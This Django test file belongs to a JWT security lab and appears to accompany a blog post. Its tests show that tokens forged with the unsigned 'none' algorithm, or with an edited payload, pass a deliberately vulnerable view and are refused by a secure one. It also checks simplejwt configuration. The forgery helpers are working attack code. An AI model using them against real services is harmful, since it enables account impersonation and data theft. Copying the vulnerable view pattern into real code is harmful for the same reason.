"""Runnable proof that a view which reads a JWT without checking its signature
serves any user the token names — and that letting DRF authenticate the request
closes it.

Postgres is the only supported backend, locally and in CI:

    docker compose run --rm web python manage.py test labs.post_16_jwt

``test_an_unsigned_token_naming_bob_reaches_the_flag`` and
``test_secure_refuses_the_unsigned_token`` are the pair that matters: the same
forged token, served the flag by one view and refused by the other.

The later groups pin configuration rather than the vulnerability. The project's
``SIMPLE_JWT`` block is asserted (its own key, short access tokens, revocation on
a password change), and so are the simplejwt defaults it replaces, so a release
that changes them turns this repo red instead of quietly making the post wrong.
The last test fails on purpose: logout does not end the access token that made
the request, and no setting changes that.
"""

import base64
import json
import time
import uuid
from datetime import timedelta
from unittest import expectedFailure

import jwt
from django.conf import settings
from django.contrib.auth.models import User
from django.test import TestCase
from rest_framework_simplejwt.settings import DEFAULTS, api_settings
from rest_framework_simplejwt.tokens import AccessToken, BlacklistMixin, RefreshToken
from rest_framework_simplejwt.utils import aware_utcnow, get_md5_hash_password

from labs._common.users import PASSWORD

from .seed import FLAG, seed

VULN = "/jwt/vulnerable/export/"
SECURE = "/jwt/secure/export/"
TOKEN = "/jwt/token/"
REFRESH = "/jwt/token/refresh/"
LOGOUT = "/jwt/logout/"


def unsigned_token(user_id):
    """What an attacker types: alg "none", a payload naming the victim, no signature."""
    return jwt.encode({"user_id": str(user_id)}, None, algorithm="none")


def edited_token(token, user_id):
    """A genuine token with its payload rewritten. The signature no longer matches."""
    header, payload, signature = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    claims["user_id"] = str(user_id)
    forged = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
    return f"{header}.{forged}.{signature}"


class JwtLabTests(TestCase):
    def setUp(self):
        seed()
        self.alice = User.objects.get(username="alice")
        self.bob = User.objects.get(username="bob")

    # helpers -----------------------------------------------------------------

    def obtain(self, username):
        resp = self.client.post(TOKEN, {"username": username, "password": PASSWORD})
        self.assertEqual(resp.status_code, 200, resp.content)
        return resp.json()

    def get(self, url, token):
        return self.client.get(url, HTTP_AUTHORIZATION=f"Bearer {token}")

    # --- the premise ---------------------------------------------------------

    def test_secure_view_serves_alice_her_own_export(self):
        access = self.obtain("alice")["access"]
        resp = self.get(SECURE, access)
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, "alice: 3 invoices, all paid")
        self.assertNotContains(resp, FLAG)

    # --- the exploit ---------------------------------------------------------

    def test_an_unsigned_token_naming_bob_reaches_the_flag(self):
        resp = self.get(VULN, unsigned_token(self.bob.pk))
        self.assertEqual(resp.status_code, 200)
        self.assertContains(resp, FLAG)

    def test_an_edited_genuine_token_reaches_the_flag(self):
        access = self.obtain("alice")["access"]
        resp = self.get(VULN, edited_token(access, self.bob.pk))
        self.assertContains(resp, FLAG)

    # --- the fix -------------------------------------------------------------

    def test_secure_refuses_the_unsigned_token(self):
        resp = self.get(SECURE, unsigned_token(self.bob.pk))
        self.assertEqual(resp.status_code, 401)
        self.assertNotContains(resp, FLAG, status_code=401)

    def test_secure_refuses_the_edited_token(self):
        access = self.obtain("alice")["access"]
        resp = self.get(SECURE, edited_token(access, self.bob.pk))
        self.assertEqual(resp.status_code, 401)

    def test_secure_refuses_a_token_signed_with_secret_key(self):
        """The leaked-SECRET_KEY case: claims the secure view accepts under the
        project's key, signed instead with the key simplejwt uses by default."""
        now = int(time.time())
        claims = {
            "token_type": "access",
            "exp": now + 300,
            "iat": now,
            "jti": uuid.uuid4().hex,
            "user_id": str(self.bob.pk),
            # CHECK_REVOKE_TOKEN refuses a token without this claim whatever signed
            # it, so leaving it out would make the 401 below pass for the wrong reason.
            api_settings.REVOKE_TOKEN_CLAIM: get_md5_hash_password(self.bob.password),
        }
        genuine = jwt.encode(claims, api_settings.SIGNING_KEY, algorithm="HS256")
        forged = jwt.encode(claims, settings.SECRET_KEY, algorithm="HS256")
        self.assertContains(self.get(SECURE, genuine), FLAG)
        self.assertContains(self.get(VULN, forged), FLAG)
        self.assertEqual(self.get(SECURE, forged).status_code, 401)

    def test_secure_refuses_an_expired_token(self):
        token = AccessToken.for_user(self.alice)
        token.set_exp(from_time=aware_utcnow() - timedelta(minutes=10))
        self.assertEqual(self.get(SECURE, token).status_code, 401)

    # --- the project's configuration ------------------------------------------

    def test_password_change_revokes_access_tokens(self):
        access = AccessToken.for_user(self.alice)
        self.alice.set_password("a new passphrase, long enough")
        self.alice.save()
        response = self.client.get(SECURE, HTTP_AUTHORIZATION=f"Bearer {access}")
        self.assertEqual(response.status_code, 401)

    def test_the_project_signs_with_its_own_key(self):
        self.assertNotEqual(api_settings.SIGNING_KEY, settings.SECRET_KEY)

    def test_access_tokens_live_five_minutes_at_most(self):
        self.assertLessEqual(api_settings.ACCESS_TOKEN_LIFETIME, timedelta(minutes=5))

    # --- the simplejwt defaults this project replaces ---------------------------

    def test_simplejwt_defaults_are_the_ones_the_post_describes(self):
        self.assertEqual(DEFAULTS["SIGNING_KEY"], settings.SECRET_KEY)
        self.assertEqual(DEFAULTS["ACCESS_TOKEN_LIFETIME"], timedelta(minutes=5))
        self.assertEqual(DEFAULTS["REFRESH_TOKEN_LIFETIME"], timedelta(days=1))
        self.assertFalse(DEFAULTS["ROTATE_REFRESH_TOKENS"])
        self.assertFalse(DEFAULTS["BLACKLIST_AFTER_ROTATION"])
        self.assertFalse(DEFAULTS["CHECK_REVOKE_TOKEN"])

    def test_only_refresh_tokens_can_be_blacklisted(self):
        self.assertTrue(issubclass(RefreshToken, BlacklistMixin))
        self.assertFalse(issubclass(AccessToken, BlacklistMixin))

    # --- logout ---------------------------------------------------------------

    def test_logout_retires_the_refresh_token(self):
        pair = self.obtain("alice")
        resp = self.client.post(
            LOGOUT, {"refresh": pair["refresh"]},
            HTTP_AUTHORIZATION=f"Bearer {pair['access']}",
        )
        self.assertEqual(resp.status_code, 205)
        self.assertEqual(self.client.post(REFRESH, {"refresh": pair["refresh"]}).status_code, 401)

    # Fails under every simplejwt configuration: AccessToken has no blacklist, so
    # the token that made the logout request still authenticates until its exp.
    # Kept as the most precise statement of what this project accepts. It starts
    # passing the day someone builds an access-token denylist — then delete the
    # decorator.
    @expectedFailure
    def test_logout_ends_the_access_token(self):
        pair = self.obtain("alice")
        self.client.post(
            LOGOUT, {"refresh": pair["refresh"]},
            HTTP_AUTHORIZATION=f"Bearer {pair['access']}",
        )
        self.assertEqual(self.get(SECURE, pair["access"]).status_code, 401)
